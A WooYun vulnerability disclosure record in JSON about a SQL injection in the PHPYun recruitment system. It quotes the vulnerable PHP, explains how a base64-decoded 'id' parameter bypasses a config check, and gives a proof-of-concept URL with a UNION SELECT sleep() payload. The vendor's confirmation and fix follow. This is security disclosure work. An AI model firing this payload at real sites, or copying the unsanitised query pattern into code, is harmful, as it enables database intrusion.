{"id": 6022, "wybug_id": "wooyun-2013-043229", "wybug_title": "phpyun SQL注入", "wybug_corp": "php云人才系统", "wybug_author": "猪头子", "wybug_date": "2013-11-18 14:33", "wybug_open_date": "2014-02-16 14:33", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向公众公开  简要描述： 处理不当导致注入，绕过waf 详细说明：  在/model/qqconnect.class.php文件中：\nfunction cert_action(){    \t$id=$_GET['id'];\t\t$arr=@explode(\"|\",base64_decode($id));\t\tif($id && is_array($arr) && $arr[0] && $arr[2]==$this->config['coding']){\t\t\t$row=$this->obj->DB_select_once(\"company_cert\",\"`uid`='\".$arr[0].\"' and `check2`='\".$arr[1].\"'\");\t\t\tif(is_array($row)){\t\t\t\tif($row[status]!=1){\t\t\t\t\t$value.=\"`cert`=concat(`cert`,',1'),\";\t\t\t\t}\t\t\t\t$id=$this->obj->DB_update_all(\"company_cert\",\"`status`='1'\",\"`uid`='\".$arr[0].\"' and `check2`='\".$arr[1].\"'\");\t\t\t\tif($_GET['type']==\"3\"){\t\t\t\t\t$value.=\"`email`='\".$row['check'].\"'\";\t\t\t\t\t$id?$this->obj->DB_update_all(\"lt_info\",$value,\"`uid`='\".$arr[0].\"' \"):\"\";\t\t\t\t}else{\t\t\t\t\t$value.=\"`linkmail`='\".$row['check'].\"'\";\t\t\t\t\t$id?$this->obj->DB_update_all(\"company\",$value,\"`uid`='\".$arr[0].\"' \"):\"\";\t\t\t\t}\t\t\t\t$id?$this->obj->ACT_msg($this->config['sy_weburl'].\"/member\",\"认证成功\"):$this->obj->ACT_msg($this->config['sy_weburl'],\"认证失败，联系管理员认证\");\t\t\t}else{\t\t\t\t$this->obj->ACT_msg($this->config['sy_weburl'],\"认证失败，请检查来路\",\"2\");\t\t\t}\t\t}else{\t\t\t$this->obj->ACT_msg($this->config['sy_weburl'],\"非法操作！\",\"2\");\t\t}    }\n代码从$_GET中获取id参数然后base64解码后按|分隔，其中第0个元素和第1个元素进入了SQL查询，但在此之前有个判断：\nif($id && is_array($arr) && $arr[0] && $arr[2]==$this->config['coding']){\n这里$this->config['coding']默认为null，当我们只提交两个元素的数组时，$arr[2]也为null，因此$arr[2]==$this->config['coding']，条件成立进入判断所以注入发生：\nif($id && is_array($arr) && $arr[0] && $arr[2]==$this->config['coding']){\t\t\t$row=$this->obj->DB_select_once(\"company_cert\",\"`uid`='\".$arr[0].\"' and `check2`='\".$arr[1].\"'\");\nDB_select_once:\nfunction DB_select_once($tablename, $where = 1, $select = \"*\") {\t\t$cachename=$tablename.$where;\t\tif(!$return=$this->Memcache_set($cachename)){\t\t$SQL = \"SELECT \".$select.\" FROM \" . $this->def . $tablename . \" WHERE \".$where.\" limit 1\";\t\t\t$query = $this->db->query($SQL);\t\t\t$return=$this->db->fetch_array($query);\t\t\t$this->Memcache_set($cachename,$return);\t\t}\t\treturn $return;\t}\nquery函数：\npublic function query($sql) {\t\tif ($sql == \"\") {\t\t\t$this->show_error(\"SQL语句错误：\", \"SQL查询语句为空\");\t\t}\t\t$this->sql = $sql;\t\t$result = mysql_query($this->sql, $this->conn);\t\tif (!$result) {\t\t\t//调试中使用，sql语句出错时会自动打印出来\t\t\tif ($this->show_error) {\t\t\t\t$this->show_error(\"错误SQL语句：\", $this->sql);\t\t\t}\t\t} else {\t\t\t$this->result = $result;\t\t}\t\tif(1==1){\t\t\tglobal $starttime;\t\t\t$dbbug_error2[]=\"<br>\";\t\t\t$dbbug_error2[sql]=$this->sql.\"<br>\";\t\t\t$dbbug_error2[\"time\"]=$this->getmicrotime()-$starttime.\"<br>\";\t\t\t//$dbbug_error2[]=\"<br>\";\t\t\t//print_r($dbbug_error2);//查看sql语句\t\t\t$this->debug=$dbbug_error;\t\t}\t\treturn $this->result;\t}\n   漏洞证明：  提交\nhttp://www.evil.com/phpyun/index.php?M=qqconnect&C=cert&id=enR6JyBhbmQgMT0yIHVuaW9uIHNlbGVjdCB1c2VyKCksMiwzLDQsNSw2LDcsOCw5OyN8enR6\nid是ztz' and 1=2 union select sleep(10),2,3,4,5,6,7,8,9;#|ztz的base64编码拼接的SQL语句为：\nSELECT * FROM phpyun_company_cert WHERE `uid`='ztz' and 1=2 union select sleep(30),2,3,4,5,6,7,8,9;#' and `check2`='ztz' limit 1\n执行后sleep了30s   修复方案：  对base64解码后的值进行过滤   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-11-18 15:57 厂商回复： 感谢您的提供！我们会及时修复。 最新状态： 2013-11-18：您好，我们已经修复该漏洞！再次感谢！  ", "replys": "漏洞评价：\n评论\n     2013-11-18 14:50 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  waf本来就不能防sql注入啊    \n     2013-11-18 14:56 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @寂寞的瘦子 额说错。。准确的说是无视前端的过滤    \n     2013-11-18 15:34 |    \t\tKavia \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:10        )\t\t \n  这是要发啊！    \n     2014-04-18 15:41 |    \t\tevil_webshell \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 致力于web层面的安全，热爱黑客技术，正在...)\t\t \n  学习了，涨姿势了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}